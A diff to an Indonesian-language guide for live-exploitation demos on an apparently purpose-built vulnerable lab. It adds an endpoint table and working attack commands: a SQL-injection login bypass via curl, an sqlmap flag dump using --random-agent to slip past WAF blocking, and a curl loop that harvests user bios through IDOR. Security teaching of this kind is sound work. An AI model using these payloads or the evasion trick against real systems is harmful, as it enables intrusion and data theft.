@@ -3,6 +3,19 @@
 
 Dokumen ini berisi panduan teknis untuk demonstrasi live-exploitation. Fokus pada penggunaan tools Linux (cURL, SQLmap) dan pemahaman akar masalah (Root Cause) pada kode.
 
+## 🗺️ Lab & API Directory
+Gunakan tabel ini untuk menentukan target saat menggunakan tools seperti `cURL` atau `sqlmap`.
+
+| Challenge | HTML Page (GUI) | Vulnerable API Endpoint | Method |
+|-----------|-----------------|-------------------------|--------|
+| **SQLi Login** | `/labs/sqli-login` | `/api/auth/login` | POST |
+| **SQLi Union** | `/labs/sqli-union` | `/api/search?q=test` | GET |
+| **XSS Reflected** | `/labs/xss-reflected` | `/labs/xss-reflected?q=test` | GET |
+| **XSS Stored** | `/labs/xss-stored` | `/api/guestbook` | POST |
+| **IDOR** | `/labs/idor` | `/api/profile?id=1` | GET |
+| **CSRF** | `/labs/csrf` | `/api/profile` | POST |
+| **Open Redirect** | `/labs/redirect` | `/api/redirect?url=test` | GET |
+
 ---
 
 ## 1. SQL Injection: Authentication Bypass
@@ -23,7 +36,7 @@ Bapak bisa pamer pakai payload yang lebih "keren" ini:
 
 ### 🤖 Automated (cURL)
 ```bash
-curl -X POST http://localhost:3000/api/auth/login \
+curl -X POST https://act-lab.up.railway.app/api/auth/login \
      -H "Content-Type: application/json" \
      -d '{"username":"admin", "password":"admin'\'' #"}'
 ```
@@ -44,8 +57,8 @@ Kalau `' UNION SELECT ...` sudah biasa, coba tunjukkan cara menebak versi databa
 
 ### 🤖 Automated (SQLmap Pro)
 ```bash
-# Dumping flag secara spesifik
-sqlmap -u "http://localhost:3000/api/search?q=test" --technique=U --dbms=sqlite --dump -C flag
+# PENTING: Target ke API! Gunakan --random-agent agar tidak di-blok Railway/WAF
+sqlmap -u "https://act-lab.up.railway.app/api/search?q=test" --batch --random-agent --dump -T challenges -C flag
 ```
 
 ---
@@ -76,7 +89,7 @@ Sistem menggunakan `.innerHTML` (Frontend) dan Query SQL mentah (Backend) tanpa 
 Bukan cuma ganti ID, tapi tunjukkan cara "Mass Exfiltration" pakai satu baris perintah Linux:
 ```bash
 # Ambil bio dari 20 user pertama secara otomatis
-for i in {1..20}; do curl -s "http://localhost:3000/api/profile?id=$i" | grep -oP '"bio":"\K[^"]+'; done
+for i in {1..20}; do curl -s "https://act-lab.up.railway.app/api/profile?id=$i" | grep -oP '"bio":"\K[^"]+'; done
 ```
 
 ---
